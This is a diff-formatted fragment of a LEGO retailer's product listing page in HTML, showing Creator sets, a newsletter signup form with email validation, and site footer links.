+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2013/08/31011_alt1.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16  treehouse">
+                        	<a href="http://lego.lk/products/creator/tree-house-2/"><span><strong>Tree House</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2013/08/31010_alt1.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16  smallcottage">
+                        	<a href="http://lego.lk/products/creator/small-cottage/"><span><strong>Small Cottage</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2013/08/31009_alt1.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16  powermech">
+                        	<a href="http://lego.lk/products/creator/power-mech-lg31007/"><span><strong>Power Mech</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2013/08/31007_alt3.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16  highwayspeedster">
+                        	<a href="http://lego.lk/products/creator/highway-speedster/"><span><strong>Highway Speedster</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2013/08/31006_alt1.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16  fierceflyer">
+                        	<a href="http://lego.lk/products/creator/fierce-flyer/"><span><strong>Fierce Flyer</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2013/08/31004_alt1.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16  redrotors">
+                        	<a href="http://lego.lk/products/creator/red-rotors/"><span><strong>Red Rotors</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2013/08/31003_alt1.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16  superracer">
+                        	<a href="http://lego.lk/products/creator/super-racer/"><span><strong>Super Racer</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2013/08/31002_alt1.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16  miniskyflyer">
+                        	<a href="http://lego.lk/products/creator/mini-skyflyer/"><span><strong>Mini Skyflyer</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2013/08/31001_alt1.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16  minispeeder">
+                        	<a href="http://lego.lk/products/creator/mini-speeder/"><span><strong>Mini Speeder</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2013/08/31000_alt4.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16  minifiretruck">
+                        	<a href="http://lego.lk/products/creator/mini-fire-truck/"><span><strong>Mini Fire Truck</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2013/08/6911_alt1.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16  prehistorichunters">
+                        	<a href="http://lego.lk/products/creator/prehistoric-hunters-lg6914/"><span><strong>Prehistoric Hunters</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2013/01/LG6914_1_products_main.gif"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                          
+                      </ul>
+                     </div>   
+
+                     </div>
+      <script type="text/javascript">
+        $(function() {
+          /*  $("#demo5").paginate({
+                count         : 28,
+                start         : 1,
+                display     : 7,
+                border                    : true,
+                border_color            : '#fff',
+                text_color              : '#fff',
+                background_color        : 'black',    
+                border_hover_color        : '#ccc',
+                text_hover_color          : '#000',
+                background_hover_color    : '#fff', 
+                images                    : false,
+                mouse                    : 'press',
+                onChange                 : function(page){
+                                            $('._current','#paginationdemo').removeClass('_current').hide();
+                                            $('#p'+page).addClass('_current').show();
+                                          }
+            }); */
+        });
+        </script>               
+                     
+                     
+                     
+                     
+                     
+                      
+                <div id="demo5"></div>  
+                                </section>   
+            </section>
+            
+
+        </div><!--hero-->
+    </div><!--wrapper-->
+     </div>
+
+<div class="pre-footer">
+	<div class="middle-cvr-pre-footer">
+    	<div class="ul-cvr">
+        <h2>LEGO</h2>
+        	<ul>
+            	<a href="http://lego.lk/#"><li>Home</li></a>
+                <a href="http://lego.lk/about/"><li>About</li></a>
+                <a href="http://lego.lk/customer-care/"><li>Customer Care </li></a>
+                <a href="http://lego.lk/where-to-buy/"><li>Where to Buy</li></a>
+                <a href="http://lego.lk/lego-club/"><li>Lego Club</li></a>
+            </ul>
+        </div>
+       <!-- <div class="ul-cvr">
+        <h2>The heading</h2>
+        	<ul>
+            	<li>link1</li>
+                <li>link1</li>
+                <li>link1</li>
+                <li>link1</li>
+                <li>link1</li>
+            </ul>
+        </div>    -->
+        <div class="ul-cvr">
+        <h2>NEWS LETTER</h2>
+        	<ul class="special">
+            	<!--<li><input type="text" /><br/></li>-->
+                <li></li>
+               <!--<li><a href="#" class="btn-legoclub" >Sign up</a></li>    -->
+               <li> 
+               
+                <div class="signup-footer">
+                    <form id="footer_subcri" name="footer_subcri">
+                    <input type="hidden" class="signup"   name="nn" id="nn" />   
+                    <input style="margin-bottom:0px;" class="news-letter" onblur="if (this.value=='') this.value=this.defaultValue" onclick="if (this.defaultValue==this.value) this.value=''" value="Your email" name="ne"> 
+                    <input type="hidden" class="signup"   name="np1" id="np1" />                     
+                    <input type="hidden" class="signup"  name="np2" id="np2"/>
+                    <input type="hidden" class="signup"   name="np3" id="np3" />                     
+                    <input type="hidden" class="signup"   name="np4" id="np4"/>                     
+                    <input type="hidden" class="signup"   name="np5" id="np5" /> 
+                    <input type="hidden" name="na" value="s"> 
+                    <input type="hidden" name="nr" value="plugin">
+                    <input type="submit" class="btn-legoclub footer_sub"  value="Subscribe">
+                    </form>
+                </div>
+                <script type="text/javascript">  
+                    var frmvalidator  = new Validator("footer_subcri"); 
+                    frmvalidator.addValidation("ne","req","please enter email");  
+                    frmvalidator.addValidation("ne","email","please enter valid email");
+              </script>  
+               </li> 
+            </ul>
+        </div>
+        <div class="ul-cvr">
+        <h2>FOLLOW US</h2>
+        	<ul class="fb">
+                    <li><a href="https://www.facebook.com/lego.lk"><img src="http://lego.lk/wp-content/themes/KTI-lego/img/images/FACEBOOK_70.png" /></a></li>
+                <li><a href="https://twitter.com/Lego_LK"><img src="http://lego.lk/wp-content/themes/KTI-lego/img/images/FACEBOOK_72.png" /></a></li>  
+                <!-- <li>
+                   <div style="margin-left: 21px; float: right; margin-top: -3px;"><a href="http://www.bestweb.lk/vote/voteme.php?domain=www.lego.lk"><img width="78px" src="http://www.kti.lk/my-content/themes/rounder/design/img/voteme.png" alt="Vote For Us"></a></div>
+                 </li> -->
+
+            </ul>
+        </div>
+		<style type="text/css">
+
+                .pre-footer {
+                    position: relative;
+                }
+
+            </style>
+
+		
+    </div>
+</div>
+<footer>
+
+
+    <div class="middle-cvr-footer"><div class="cpy">&copy; 2004 - 2018 Lego by <a href="http://www.kti.lk" target="_blank">Kti Srilanka</a></div><div class="pyxle">Design & concept by <a href="http://www.pyxle.net" target="_blank">pyxle</a></div></div>
+</footer>
+ 
+</body>
+</html>
